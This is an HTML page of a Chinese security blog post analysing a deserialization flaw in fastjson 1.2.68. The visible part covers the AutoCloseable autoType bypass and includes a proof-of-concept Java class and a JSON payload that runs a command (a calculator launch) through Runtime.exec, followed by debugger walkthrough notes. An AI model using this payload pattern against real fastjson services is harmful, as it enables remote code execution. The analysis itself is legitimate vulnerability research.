<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="fastjson-005">
<meta property="og:type" content="article">
<meta property="og:title" content="fastjson 1.2.68漏洞分析">
<meta property="og:url" content="http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="九指 | [ninefiger&#39;s blog]">
<meta property="og:description" content="fastjson-005">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/1.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/2.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/3.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/4.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/5.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/6.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/a.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/7.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/8.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/9.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/10.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/11.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/12.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/13.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/b.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/c.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/14.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/15.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/16.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/17.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/18.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/19.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/20.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/21.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/22.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/23.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/24.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/25.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/26.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/27.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/28.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/29.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/30.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/31.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/32.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/33.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/34.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/35.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/36.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/37.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/38.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/39.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/40.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/41.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/42.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/43.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/44.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/45.png">
<meta property="og:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/46.png">
<meta property="article:published_time" content="2022-11-11T06:04:00.000Z">
<meta property="article:modified_time" content="2022-11-11T09:15:47.080Z">
<meta property="article:author" content="ninefiger">
<meta property="article:tag" content="漏洞分析">
<meta property="article:tag" content="fastjson">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blog.ninefiger.top/img/fastjson%201.2.68漏洞分析/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
        
      
    
    <!-- title -->
    <title>fastjson 1.2.68漏洞分析</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="九指 | [ninefiger&#39;s blog]" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/link">链接</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/about/">关于</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇 " href="/2022/11/11/fastjson%201.2.73-12.80%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/2022/11/11/fastjson%201.2.48-1.2.67%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson 1.2.68漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson 1.2.68漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=fastjson 1.2.68漏洞分析&body=Check out this article: http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson 1.2.68漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson 1.2.68漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson 1.2.68漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-AutoCloseable"><span class="toc-number">1.</span> <span class="toc-text">1. AutoCloseable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-Demo%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 Demo测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-1-%E8%AE%A1%E7%AE%97%E5%99%A8%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1.1 计算器测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.1.2 反序列化中类的构造方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-AutoCloseable%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 AutoCloseable反序列化调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-1-checkAutoType%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.2.1 checkAutoType流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-1-1-safeModeMask"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">1.2.1.1 safeModeMask</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2-1-2-%E5%86%85%E7%BD%AE%E7%9A%84mappings"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">1.2.1.2 内置的mappings</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-2-deserializer"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.2 deserializer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-3-%E5%86%8D%E6%AC%A1%E8%BF%9B%E5%85%A5checkAutoType"><span class="toc-number">1.2.3.</span> <span class="toc-text">1.2.3 再次进入checkAutoType</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">2. 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-oracle-jdbc-rowset-OracleJDBCRowSet"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 oracle.jdbc.rowset.OracleJDBCRowSet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-fastjson1-2-68"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1 fastjson1.2.68</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-fastjson1-2-50"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.3 fastjson1.2.50</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-FileOutputStream"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 FileOutputStream</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-1-%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%88%B0%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 获取不到构造方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-2-%E5%85%AC%E5%BC%80%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 公开的利用链</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Mysql%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 Mysql利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-1-Mysql-connector-5-1-x"><span class="toc-number">2.3.1.</span> <span class="toc-text">2.3.1 Mysql connector 5.1.x</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-1-1-%E8%A7%A6%E5%8F%91mysql%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">2.3.1.1 触发mysql连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-1-2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">2.3.1.2 反序列化</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-2-Mysql-Connector-6-0-x"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.3.2 Mysql Connector 6.0.x</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-1-%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">2.3.2.1 构造方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-2-%E8%A7%A6%E5%8F%91mysql%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">2.3.2.2 触发mysql连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">2.3.2.3 反序列化</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-3-Mysql-Connector-8-x"><span class="toc-number">2.3.3.</span> <span class="toc-text">2.3.3 Mysql Connector 8.x</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-Commons-io%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 Commons-io利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-1-ref"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1 $ref</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-2-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2 写入文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-1-XmlStreamReader"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">2.4.2.1 XmlStreamReader</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-1-TeeInputStream"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">2.4.2.1 TeeInputStream</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-3-%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">2.4.2.3 触发流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-4-%E6%97%A0%E6%B3%95%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">2.4.2.4.</span> <span class="toc-text">2.4.2.4 无法写入文件内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-4-2-5-%E4%BF%AE%E6%94%B9%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%ADWriteOutputStream%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">2.4.2.5.</span> <span class="toc-text">2.4.2.5 修改利用链中WriteOutputStream的参数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-3-%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.3.</span> <span class="toc-text">2.4.3 读文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-pgsql%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 pgsql利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-1-PgConnection"><span class="toc-number">2.5.1.</span> <span class="toc-text">2.5.1 PgConnection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-2-ClassPathXmlApplicationContext%E5%AE%9E%E4%BE%8B%E5%8C%96"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.5.2 ClassPathXmlApplicationContext实例化</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        fastjson 1.2.68漏洞分析
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ninefiger</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-11-11T06:04:00.000Z" itemprop="datePublished">2022-11-11</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6/">攻防研究</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/fastjson/" rel="tag">fastjson</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="1-AutoCloseable"><a href="#1-AutoCloseable" class="headerlink" title="1. AutoCloseable"></a>1. AutoCloseable</h2><blockquote>
<p>An object that may hold resources (such as file or socket handles) until it is closed. The close() method of an AutoCloseable object is called automatically when exiting a try-with-resources block for which the object has been declared in the resource specification header. This construction ensures prompt release, avoiding resource exhaustion exceptions and errors that may otherwise occur.<br>API Note:</p>
<p>It is possible, and in fact common, for a base class to implement AutoCloseable even though not all of its subclasses or instances will hold releasable resources. For code that must operate in complete generality, or when it is known that the AutoCloseable instance requires resource release, it is recommended to use try-with-resources constructions. However, when using facilities such as java.util.stream.Stream that support both I/O-based and non-I/O-based forms, try-with-resources blocks are in general unnecessary when using non-I/O-based forms.<br>Since:<br>1.7</p>
<p>Author:<br>Josh Bloch<br>一个在关闭之前可能持有资源（例如文件或套接字句柄）的对象。 AutoCloseable 对象的 close() 方法在退出资源规范标头中已为其声明对象的 try-with-resources 块时自动调用。 这种构造确保了及时释放，避免了资源耗尽异常和错误，否则可能会发生。<br>API 注释：</p>
<p>即使不是所有的子类或实例都拥有可释放的资源，基类也有可能实现 AutoCloseable，实际上这很常见。 对于必须完全通用运行的代码，或者当已知 AutoCloseable 实例需要资源释放时，建议使用 try-with-resources 构造。 但是，当使用 java.util.stream.Stream 等支持基于 I/O 和非基于 I/O 的形式的工具时，在使用非 I/O- 时通常不需要 try-with-resources 块 基于表格。<br>自从：<br>1.7<br>作者：<br>乔什·布洛赫</p>
</blockquote>
<h3 id="1-1-Demo测试"><a href="#1-1-Demo测试" class="headerlink" title="1.1 Demo测试"></a>1.1 Demo测试</h3><h4 id="1-1-1-计算器测试"><a href="#1-1-1-计算器测试" class="headerlink" title="1.1.1 计算器测试"></a>1.1.1 计算器测试</h4><p>编写一个实现<code>AutoCloseable</code>接口的Demo，通过<code>fastjson</code>反序列化调用，触发代码执行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_1_2_68</span> <span class="keyword">implements</span> <span class="title">AutoCloseable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">poc_1_2_68</span><span class="params">(String cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String poc1 = <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;     \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;         \&quot;@type\&quot;: \&quot;vuln.poc_1_2_68\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;         \&quot;cmd\&quot;: \&quot;open /System/Applications/Calculator.app\&quot;&quot;</span> +</span><br><span class="line">            <span class="string">&quot; &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        String poc = poc1;</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="1-1-2-反序列化中类的构造方法"><a href="#1-1-2-反序列化中类的构造方法" class="headerlink" title="1.1.2 反序列化中类的构造方法"></a>1.1.2 反序列化中类的构造方法</h4><p>这里在Demo中，没有设定无参构造方法，但是为什么还能反序列化成功？之前在1.2.24最开始分析的时候，当时记录的反序列化过程中只会找无参构造方法，如果没有的话会怎么样呢？<br>在之前的调试中，对于类的构造方法、Field、Method都放在<code>beanInfo</code>，因此在生成<code>beanInfo</code>对象处下断点</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/1.png" alt="1" style="zoom:50%;" /></div>

<p>在<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>中；在这没有看到对构造方法参数的判断，只是循环赋值给<code>creatorConstructor</code>，比如有两个构造方法，其中会根据已经遍历过的构造方法的参数长度作比较，选取参数数量较多的；如果参数数量相同，则会按照遍历的顺序，选取先遍历到的构造方法；</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/2.png" alt="2" style="zoom:50%;" /></div>

<p>在后面<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</code>的反序列化中，使用了<code>creatorConstructor</code>实例化对象，并传入相关参数</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/3.png" alt="2" style="zoom:50%;" /></div>

<h3 id="1-2-AutoCloseable反序列化调试"><a href="#1-2-AutoCloseable反序列化调试" class="headerlink" title="1.2 AutoCloseable反序列化调试"></a>1.2 AutoCloseable反序列化调试</h3><p>在JSON.parse()处下断点调试</p>
<h4 id="1-2-1-checkAutoType流程"><a href="#1-2-1-checkAutoType流程" class="headerlink" title="1.2.1 checkAutoType流程"></a>1.2.1 checkAutoType流程</h4><h5 id="1-2-1-1-safeModeMask"><a href="#1-2-1-1-safeModeMask" class="headerlink" title="1.2.1.1 safeModeMask"></a>1.2.1.1 safeModeMask</h5><p>首先可以看到在checkAutoType类加载过程中，多了一个safeMode，如果在parse()解析中设置了这个属性为true，则不会进行类加载，并抛出异常 <code>safeMode not support autoType</code>，这个感觉可以在提供安全建议的时候提供思路</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/4.png" alt="4" style="zoom:50%;" /></div>

<h5 id="1-2-1-2-内置的mappings"><a href="#1-2-1-2-内置的mappings" class="headerlink" title="1.2.1.2 内置的mappings"></a>1.2.1.2 内置的mappings</h5><p>到<code>getClassFromMapping</code>中，获取到了内置的java.lang.AutoCloseable类，</p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/5.png" alt="5" style="zoom:50%;" /></div>

<p>在<code>TypeUtils</code>的<code>mappings</code>中有这个类的映射，回头看了一下1.2.24的<code>mappings</code>中是没有的，而1.2.68中已经没有了1.2.47利用的<code>java.lang.Class</code></p>
<h4 id="1-2-2-deserializer"><a href="#1-2-2-deserializer" class="headerlink" title="1.2.2 deserializer"></a>1.2.2 deserializer</h4><p>获取对应的Class后，紧接着看一下是否有内置指定的<code>deserializer</code>工具；<br>调试发现，这里并没有想java.lang.Class内置了反序列化工具类，看来是走的通用的<code>createJavaBeanDeserializer</code>方法去创建<code>deserializer</code></p>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/6.png" alt="6" style="zoom:50%;" /></div>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/a.png" alt="a" style="zoom:50%;" /></div>
<div align=center><img src="/img/fastjson 1.2.68漏洞分析/7.png" alt="7" style="zoom:50%;" /></div>

